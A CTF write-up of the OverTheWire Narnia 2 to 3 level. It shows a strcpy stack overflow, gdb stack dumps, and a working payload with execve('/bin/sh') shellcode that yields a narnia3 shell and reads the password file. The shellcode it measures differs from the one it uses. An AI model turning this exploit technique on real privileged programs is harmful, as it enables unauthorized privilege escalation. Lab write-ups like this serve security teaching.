---
layout:     post
title:      "Overthewire.org - Narnia 2 -> 3"
subtitle:   "Write-Up"
date:       2017-02-03 0:00:00
author:     "W3ndige"
header-img: "img/overthewire-header.png"
permalink: /:title/
category: Overthewire
---

<h1>Introduction</h1>

<p>What about another challenge in reverse engineering? Anywhere, anytime! </p>

<h1>Challenge</h1>

<p>As always, let's start from viewing the source code.</p>

{% highlight c %}
int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}

{% endhighlight %}

<p>Okay, now let's run it. </p>

{% highlight text%}
narnia2@melinda:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@melinda:/narnia$ ./narnia2 ARGUMENT
ARGUMENTnarnia2@melinda:/narnia$
{% endhighlight %}

<p>As in the source code, we see that if argument is not passed, then usage instructions are printed, otherwise value of argument is printed on the next line. In addition, source code gives us information that char buf is 128 bytes in size. Let's try to trigger the segmentation fault. </p>

{% highlight text %}
ARGUMENTnarnia2@melinda:/narnia$ ./narnia2 $(python -c "print 'A' * 140")
Illegal instruction
narnia2@melinda:/narnia$ ./narnia2 $(python -c "print 'A' * 141")
Segmentation fault
{% endhighlight %}

<p>Hmm, that's interesting. After trying different amounts of A letters, I've noticed that by writing 140 of them, we will get <b>Illegal instruction</b> message, but 141 letters end up with our desired <b>Segmentation fault</b>. Maybe gdb will tell us something more? </p>

{% highlight text %}
narnia2@melinda:/narnia$ gdb ./narnia2
(gdb) break *main
Breakpoint 1 at 0x804845d
{% endhighlight %}

<p>Firstly let's investigate the illegal instruction option. </p>

{% highlight text %}
(gdb) run $(python -c "print 'A' * 140")
Starting program: /games/narnia/narnia2 $(python -c "print 'A' * 140")

Breakpoint 1, 0x0804845d in main ()
(gdb) c
Continuing.

Program received signal SIGILL, Illegal instruction.
0xf7e3ca00 in __libc_start_main () from /lib32/libc.so.6
(gdb) c
Continuing.

Program terminated with signal SIGILL, Illegal instruction.
The program no longer exists.

{% endhighlight %}

<p>Unfortunately after doing some research I've found out that SIGILL won't help us much. What we have to try is to overwrite the <b>instruction pointer. </b></p>

{% highlight text %}
(gdb) run $(python -c "print 'A' * 144")
Starting program: /games/narnia/narnia2 $(python -c "print 'A' * 144")

Breakpoint 1, 0x0804845d in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
{% endhighlight %}

<p>Luckily, adding only 3 more A's overwrote the pointer. But here comes another problem, what is its address? </p>
<p>We can try to find out by writing around B's at the end. Let's see. </p>

{% highlight text %}
(gdb) run $(python -c "print 'A' * 138 + 'B' * 6")
Starting program: /games/narnia/narnia2 $(python -c "print 'A' * 138 + 'B' * 6")

Breakpoint 1, 0x0804845d in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/200x $esp
0xffffd7f0:	0x00000000	0x00000000	0xb7000000	0x9449f175
0xffffd800:	0xb7857a44	0x6da4653e	0x69a15cf3	0x00363836
0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x41414141	0x42424242	0x58004242	0x535f4744
{% endhighlight %}

<p>Great! EIP address is 0xffffd8b3. Now we have to find a way to use shellcode from previous challenge. But firstly, let's find its length. </p>

{% highlight text %}
narnia2@melinda:/narnia$ python -c'print(len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"))'
25
{% endhighlight %}

<p>25 bytes. As our string have to be 144 bytes in length, I'll firstly write 112 bytes of A letters, then 25 bytes of our shellcode and then overwrite the EIP with memory address somewhere in the middle of A's. Let's try it out! </p>

{% highlight text %}
(gdb) run $(python -c "print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4")
Starting program: /games/narnia/narnia2 $(python -c "print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4")

(gdb) x/200x $esp
0xffffd7f0:	0x00000000	0x00000000	0x4d000000	0x2bdc9c96
0xffffd800:	0xd596f713	0x775b1954	0x6969a442	0x00363836
0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0xc0314141	0x2f2f6850
0xffffd8a0:	0x2f686873	0x896e6962	0x89c189e3	0xcd0bb0c2
0xffffd8b0:	0x40c03180	0x424280cd	0x58004242	0x535f4744
0xffffd8c0:	0x49535345	0x495f4e4f	0x30323d44	0x33323431
0xffffd8d0:	0x45485300	0x2f3d4c4c	0x2f6e6962	0x68736162
0xffffd8e0:	0x52455400	0x74783d4d	0x2d6d7265	0x63363532
0xffffd8f0:	0x726f6c6f	0x48535300	0x494c435f	0x3d544e45
0xffffd900:	0x362e3938	0x36312e34	0x3732312e	0x30333320
0xffffd910:	0x32203434	0x53530032	0x54545f48	0x642f3d59
0xffffd920:	0x702f7665	0x342f7374	0x434c0033	0x4c4c415f

{% endhighlight %}

<p>Great, we can see that even with the shellcode B's overwrote the EIP. Now let's try it with the actuall address - somewhere in the middle of the A letters. Maybe <b>0xffffd863</b>?</p>

{% highlight text %}
narnia2@melinda:/narnia$ ./narnia2 $(python -c "print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x63\xd8\xff\xff'")
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
{% endhighlight %}

<p>And we've got the password to the next level!</p>

<h1>Conclusion</h1>
<p>The challenge was awesome, but really time consuming. It was worth every minute as I learned a lot from trying out these different ways to finish this level. Thanks <a href="http://overthewire.org/wargames/">OverTheWire</a>!</p>

<p>~ Stay safe!</p>
